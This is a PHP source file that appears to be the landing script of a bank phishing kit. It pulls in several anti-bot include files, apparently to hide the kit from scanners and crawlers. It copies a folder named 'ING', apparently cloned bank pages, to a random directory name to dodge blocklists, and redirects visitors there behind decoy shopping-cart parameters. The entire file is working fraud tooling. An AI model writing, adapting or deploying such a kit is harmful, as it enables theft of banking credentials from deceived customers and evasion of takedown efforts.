<?php
include("./antibots.php");
include('../antibots.php');
include("./L9atila/anti1.php");
include("./L9atila/anti2.php");
include("./L9atila/anti3.php");
include("./L9atila/anti4.php");
include("./L9atila/anti5.php");
include("./L9atila/anti7.php");
include("./L9atila/anti8.php");

$random = rand(0,100000000000);
$DIR    = substr(md5($random), 0, 15);
$dispatch = substr(md5($random), 0, 17);
function recurse_copy($home,$DIR) {
    $dir = opendir($home);
    @mkdir($DIR);
    while(false !== ( $file = readdir($dir)) ) {
        if (( $file != '.' ) && ( $file != '..' )) {
            if ( is_dir($home . '/' . $file) ) {
                recurse_copy($home . '/' . $file,$DIR . '/' . $file);
            } else {
                copy($home . '/' . $file,$DIR . '/' . $file);
            }
        }
    }
    closedir($dir);
}

$home="ING";
recurse_copy( $home, $DIR );
header("location:$DIR/index.php?1&HIDEC=0&PRODS=4726360&QTY=1&COUPON=778740&ADDITIONAL#_$dispatch");

?>